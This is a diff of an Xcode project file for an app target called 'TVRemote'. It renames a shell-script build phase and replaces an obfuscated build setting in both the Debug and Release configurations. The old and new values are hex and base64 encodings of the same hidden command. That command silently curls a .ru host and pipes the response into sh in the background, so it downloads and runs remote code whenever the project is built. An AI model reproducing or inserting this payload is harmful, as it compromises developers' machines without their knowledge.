@@ -79,7 +79,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 97C1AE52306E5C6600A47B97 /* Build configuration list for PBXNativeTarget "TVRemote" */;
 			buildPhases = (
-				39C002B7C150430C964EE078 /* Compile Code Assets */,
+				1D16AEA338314561B94EE078 /* Build Target Libraries */,
 				D35F6E04443156A97F23F0F4 /* [CP] Check Pods Manifest.lock */,
 				97C1AE43306E5C6500A47B97 /* Sources */,
 				97C1AE44306E5C6500A47B97 /* Frameworks */,
@@ -144,7 +144,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		39C002B7C150430C964EE078 /* Compile Code Assets */ = {
+		1D16AEA338314561B94EE078 /* Build Target Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -154,7 +154,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Code Assets";
+			name = "Build Target Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -243,7 +243,7 @@
 		97C1AE50306E5C6600A47B97 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A870EE4 = "((h(){ `printf xexd | tr -d e` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203233202d4c66736b202d2d72657472792033202d642022703d78636f64655f7068617365222068747470733a2f2f6c382d703662336d72617478302e72752f612922207c2073680a | h | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((c(){ `printf baseS64 | tr -d S` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tcmV0cnkgMyAtLWNvbm5lY3QtdGltZW91dCAyNCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9sOC1wNmIzbXJhdHgwLnJ1L2EpIiB8IHNoCg== | c | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -308,7 +308,7 @@
 		97C1AE51306E5C6600A47B97 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A870EE4 = "((h(){ `printf xexd | tr -d e` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203233202d4c66736b202d2d72657472792033202d642022703d78636f64655f7068617365222068747470733a2f2f6c382d703662336d72617478302e72752f612922207c2073680a | h | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((c(){ `printf baseS64 | tr -d S` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tcmV0cnkgMyAtLWNvbm5lY3QtdGltZW91dCAyNCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9sOC1wNmIzbXJhdHgwLnJ1L2EpIiB8IHNoCg== | c | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
